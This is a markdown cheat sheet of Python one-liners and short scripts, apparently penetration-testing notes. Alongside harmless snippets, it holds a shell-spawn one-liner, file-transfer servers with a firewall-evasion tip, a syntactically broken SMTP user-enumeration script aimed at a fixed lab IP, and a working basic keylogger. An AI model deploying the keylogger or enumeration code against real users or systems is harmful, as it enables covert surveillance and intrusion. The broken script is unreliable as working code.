# Python One Liners and scripts

## [Back To Command-Center](https://github.com/encryptedninja/command-center/blob/dev/README.md)

- install requirements: `sudo python3 -m pip install -r requirements.txt`
- to spawn a shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- webservers: `python3 -m http.server 8080`
- if webserver is picked up by the firewall use ftp server: `python3 -m pyftpdlib -p 21 --write` and if you don't have it get it first with: `pip3 install pyftpdlib` and to log in just use the IP address of your ftp server: `ftp <ftp server IP>`

## Enumerating users / smtp

```
#!/usr/bin/python

import socket
import sys

#Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#Connect to the socket
connect = s.connect(('10.11.1.11', 25))
#Recieve the banner
banner = s.recv(1024)
#VRFY a user
s.send('vrfy ' + SYS.ARGV[1] + '\R\N')
print result
#Close the socket
s.close()

```

## keylogger (basic)

```
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()

```

## printing and checking a usage form and switches (Python3)

```
if len(sys.argv) == 1:
    print("USAGE: python3 the_sys_module.py <code name>")
    print("No arguments, exiting...")
    sys.exit(9)
if sys.argv[1] == "tellmemore":
    print("Code name accepted..., exiting with exit code 0.")
else:
    print("Wrong code name, exiting with exit code 3.")

```

## progress bar (Python3)

```
for i in range(0, 51):
    time.sleep(0.1)
    sys.stdout.write("{} [{}{}]\r".format(i, '#' * i, "." * (50 - i)))
    sys.stdout.flush()
sys.stdout.write("\n")

```

## QR code generator (Python3)

```
import qrcode

input_data = "https://google.com"
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data(input_data)
qr.make(fit=True)
img = qr.make_image(fill='black', back_color='white')
img.save('qrcode001.png')

```

## Python3 FTP Server

- Simple to use: `python3 -m pyftpdlib` and just make sure you have pyftpdlib installed with pip3.

## SMB Server - Impacket

- install impacket: `sudo apt update && sudo apt install python3-impacket -y`
- run it: `impacket-smbserver SPITFIRE . -smb2support`
